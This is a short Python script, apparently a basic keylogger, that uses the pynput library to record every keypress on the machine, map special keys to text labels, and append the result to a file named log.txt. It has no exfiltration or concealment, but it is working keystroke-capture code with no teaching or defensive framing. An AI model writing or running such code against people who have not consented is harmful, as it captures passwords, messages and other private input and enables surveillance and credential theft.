from pynput.keyboard import Key,Listener

# Map special keys to their corresponding characters
key_map = {
    Key.space: ' ',
    Key.enter: '\n',
    Key.tab: '\t',
    Key.backspace: '<BACKSPACE>',
    Key.delete: '<DELETE>',
    Key.left: '<LEFT>',
    Key.right: '<RIGHT>',
    Key.up: '<UP>',
    Key.down: '<DOWN>',
    Key.esc: '<ESC>',
    Key.f1: '<F1>',
    Key.f2: '<F2>',
    Key.f3: '<F3>',
    Key.f4: '<F4>',
    Key.f5: '<F5>',
    Key.f6: '<F6>',
    Key.f7: '<F7>',
    Key.f8: '<F8>',
    Key.f9: '<F9>',
    Key.f10: '<F10>',
    Key.f11: '<F11>',
    Key.f12: '<F12>',
    Key.ctrl_l: '<LEFT CTRL>',
    Key.ctrl_r: '<RIGHT CTRL>',
    Key.alt_l: '<LEFT ALT>',
    Key.alt_r: '<RIGHT ALT>',
    Key.shift: '<SHIFT>',
    Key.shift_r: '<RIGHT SHIFT>',
    Key.cmd: '<WIN>',
    Key.cmd_r: '<RIGHT WIN>',
    Key.caps_lock: '<CAPS LOCK>',
    Key.num_lock: '<NUM LOCK>',
    Key.scroll_lock: '<SCROLL LOCK>',
    Key.insert: '<INSERT>',
    Key.home: '<HOME>',
    Key.end: '<END>',
    Key.page_up: '<PAGE UP>',
    Key.page_down: '<PAGE DOWN>',
    Key.print_screen: '<PRINT SCREEN>',
    Key.pause: '<PAUSE>',
    Key.pause: '<PAUSE>',
}

def write_to_file(key):
    try:
        # Check if the key is a special key
        if key in key_map:
            letter = key_map[key]
        elif hasattr(key, 'char') and key.char:
            # Regular characters
            letter = key.char
        else:
            # For other keys, we might want to handle them or ignore
            letter = ''
        
        # Write the letter to the file
        with open("log.txt", 'a') as f:
            f.write(letter)
    except Exception as e:
        # Handle exceptions (e.g., file errors, etc.)
        print(f"An error occurred: {e}")

# Collecting events until stopped
with Listener(on_press=write_to_file) as listener:
    listener.join()
